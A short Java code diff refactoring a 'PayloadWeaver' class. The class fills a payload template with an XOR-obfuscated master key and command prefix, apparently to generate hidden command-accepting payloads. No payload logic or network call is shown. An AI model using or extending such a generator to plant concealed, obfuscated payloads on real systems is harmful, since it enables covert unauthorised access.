@@ -212,12 +212,12 @@ public class PayloadWeaver {
         replacements.put("CLASS_NAME", className);
         replacements.put("MASTER_KEY_ENC", StringEncryptor.byteArrayToCode(
                 StringEncryptor.xorEncrypt(
-                        Config.getMasterKey().getBytes(StandardCharsets.UTF_8), Config.XOR_KEY)
+                        Config.getMasterKey().getBytes(StandardCharsets.UTF_8), Config.getXorKey())
         ));
-        replacements.put("XOR_KEY", StringEncryptor.byteArrayToCode(Config.XOR_KEY));
+        replacements.put("XOR_KEY", StringEncryptor.byteArrayToCode(Config.getXorKey()));
         replacements.put("COMMAND_PREFIX_ENC", StringEncryptor.byteArrayToCode(
                 StringEncryptor.xorEncrypt(
-                        Config.COMMAND_PREFIX.getBytes(StandardCharsets.UTF_8), Config.XOR_KEY)
+                        Config.COMMAND_PREFIX.getBytes(StandardCharsets.UTF_8), Config.getXorKey())
         ));
 
         String source = templateContent;
@@ -229,8 +229,9 @@ public class PayloadWeaver {
     }
 
     public String loadTemplate() throws IOException {
-        try (InputStream is = getClass().getResourceAsStream("/templates/payload.template")) {
-            if (is == null) return "";
+        InputStream is = getClass().getResourceAsStream("/templates/payload.template");
+        if (is == null) return "";
+        try (is) {
             return new String(is.readAllBytes(), StandardCharsets.UTF_8);
         }
     }
